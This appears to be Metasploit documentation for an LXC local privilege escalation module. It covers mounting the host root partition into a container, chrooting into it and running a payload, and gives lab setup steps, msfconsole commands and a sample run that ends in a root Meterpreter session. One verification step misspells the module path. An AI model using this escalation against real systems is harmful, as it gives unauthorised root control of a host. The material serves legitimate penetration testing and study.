## Vulnerable Application

LXC Local Privilege Escalation exploiting that anyone with control over LXC such as those in the `lxd` group can mount the root partition inside of a container.

Both meterpreter shell and classic shell are supported. The exploit will use LXC to create a container and then add a device to the container that mounts the hosts root partition at `/mnt/root`, it then chroots into this directory and executes the specified `payload`.

# Creating A Testing Environment

- Install LXC
- Add a non-root user to the `lxd` group
- Download an image so that there is one available locally
- Obtain a shell on the host system as this non-root user
- Use this exploit to obtain a root shell

## Verification Steps

1. `use exploit/linux/local/lxc_privilege_escation`
2. `set SESSION [session]`
3. `set PAYLOAD [payload]`
4. `set LHOST [lhost]`
5. `set LPORT [lport]`
6. `exploit`

## Options

## PAYLOAD

Set this option to choose which type of root session you want to create.

## BaseImage

The base image to use when creating the exploit container. If not specified the first image found will be used. The only requirements are that the image is available locally (already downloaded) and we can use the chroot command, which should be close to 100% of containers.

## ForceExploit

Force exploit even if the current session is root.

## WritableDir

A directory where we can write files (default is /tmp). This is needed to drop the payload into the container.

# Scenarios

## Privilege escalation starting with a meterpreter shell

```
msf5 exploit(multi/handler) > use exploit/linux/local/lxc_privilege_escalation
msf5 exploit(linux/local/lxc_privilege_escalation) > set session 3
session => 3
msf5 exploit(linux/local/lxc_privilege_escalation) > run

[+] LXC is accessible, and there is at least one local image we can use to create a container
[*] Using base image 306c66cc1a40
[*] Writing payload executable to '/tmp/nkoGWxrsq'
[!] Creating container named fPjLQFNNC, remember to delete this after exploitation
[!] Using: lxc stop fPjLQFNNC && lxc delete fPjLQFNNC
[*] Executing script to create and run LXC container
[*] Creating container
[*] Adding mount to container
[*] Starting container
[*] Executing payload inside container

[*] Started bind TCP handler against 192.168.0.231:4444
[*] Sending stage (3012516 bytes) to 192.168.0.231
[*] Meterpreter session 4 opened (0.0.0.0:0 -> 192.168.0.231:4444) at 2020-07-19 14:50:51 +0100
```
